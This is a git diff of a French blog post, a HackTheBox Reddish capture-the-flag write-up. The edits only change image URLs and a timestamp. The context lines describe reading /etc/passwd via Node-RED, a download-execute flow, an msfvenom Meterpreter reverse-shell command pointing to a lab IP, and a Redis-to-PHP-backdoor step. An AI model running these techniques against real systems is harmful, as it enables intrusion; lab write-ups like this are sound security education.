@@ -53,7 +53,7 @@ C'est plutôt fun à utiliser et ça peut être une bonne introduction à ceux q
 
 Quoiqu'il en soit j'ai commencé à jouer avec cette interface qui m'était totalement inconnue et je suis par exemple parvenus à lire des fichiers présents sur le disque :  
 
-![HackTheBox Reddish CTF Node-RED file disclosure](https://github.com/devl00p/blog/raw/master/images/htb/reddish/reddish_web.png)
+![HackTheBox Reddish CTF Node-RED file disclosure](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reddish/reddish_web.png)
 
 Ici l'action consiste à lire un fichier. Pour cela on prend l'icône marron *file* dans la section *storage*, on la place dans le graphe puis on double clique pour entrer le path du fichier (*/etc/passwd* dans mon exemple).  
 
@@ -105,7 +105,7 @@ Après quelques essais peu concluants pour obtenir un reverse shell j'ai explor�
 
 Tout juste un *Perl*... Allez il faut pas faire le difficile :D J'ai ressorti ce vieux [dc.pl](https://gist.github.com/islanddog/f5ad7636acf61fd963531ead7c784dc9) (je compte pas le nombre de machines que je lui ait fait visiter à une époque lointaine...) mais là encore grosse déception :  
 
-![HackTheBox Reddish CTF Node-RED Perl TCP FAIL](https://github.com/devl00p/blog/raw/master/images/htb/reddish/reddish_perl_broken.png)
+![HackTheBox Reddish CTF Node-RED Perl TCP FAIL](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reddish/reddish_perl_broken.png)
 
 Quoi ? *Unknown Protocol* ? técépé tu connais pas ? Argh c'est pas vrai !  
 
@@ -121,9 +121,9 @@ Oui Perl ça pique les yeux :p
 
 Finalement c'est ce download-execute en *Node-RED* qui a eu ma faveur :  
 
-![HackTheBox Reddish CTF Node-RED download execute](https://github.com/devl00p/blog/raw/master/images/htb/reddish/reddish_download_execute.png)
+![HackTheBox Reddish CTF Node-RED download execute](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reddish/reddish_download_execute.png)
 
-![HackTheBox Reddish CTF Node-RED exec node](https://github.com/devl00p/blog/raw/master/images/htb/reddish/reddish_exec.png)
+![HackTheBox Reddish CTF Node-RED exec node](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reddish/reddish_exec.png)
 
 Il télécharge un *Meterpreter* (généré via *msfvenom -p linux/x64/meterpreter\_reverse\_tcp LHOST=10.10.14.99 LPORT=7777 -f elf -o devloop.bin*) sur mon serveur web (il faut indiquer dans la node que l'on souhaite en sortie un buffer et non une chaîne de caractères UTF-8) et l'écrit à l'emplacement de notre choix.  
 
@@ -268,7 +268,7 @@ save
 
 A noter que payload est un nom de clé pris pour l'exemple, on peut mettre ce que l'on veut. Le Redis acquiesce sans broncher (série de réponses OK) puis on obtient finalement notre shell.  
 
-![HackTheBox Reddish CTF Redis exploitation leading to PHP backdoor](https://github.com/devl00p/blog/raw/master/images/htb/reddish/reddish_www_container.png)
+![HackTheBox Reddish CTF Redis exploitation leading to PHP backdoor](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reddish/reddish_www_container.png)
 
 J'ai toutefois noté deux problèmes récurrents :  
 
@@ -631,7 +631,7 @@ Finish Reddish
 
 J'ai essayé de reconstituer un graphe des attaques en utilisant [Cacoo](https://cacoo.com) et sauf erreur ça ressemblerait à ceci :  
 
-![HackTheBox Reddish CTF attach graph](https://github.com/devl00p/blog/raw/master/images/htb/reddish/reddish_graph.png)
+![HackTheBox Reddish CTF attach graph](https://raw.githubusercontent.com/devl00p/blog/master/images/htb/reddish/reddish_graph.png)
 
 Ce qui fait de ce CTF un vrai casse-tête ce sont clairement les difficultés à devoir pivoter et reverse-pivoter d'une machine à une autre. A ce sujet il existe quelques outils mais tous semblent manquer une fonctionnalité *reverse* (à moins d'être en mesure d'utiliser SSH). Une lacune que j'espère voire comblée :)   
 
@@ -639,4 +639,4 @@ Le tout était d'autant plus compliqué que d'un reset de la box à un autre les
 
 Un peu sur ma fin pour la fin du CTF, j'attend de voir les writeups des autres participants pour savoir s'il y avait un indice particulier pour les partitions.
 
-*Published January 26 2019 at 17 48*
+*Published January 26 2019 at 17:48*
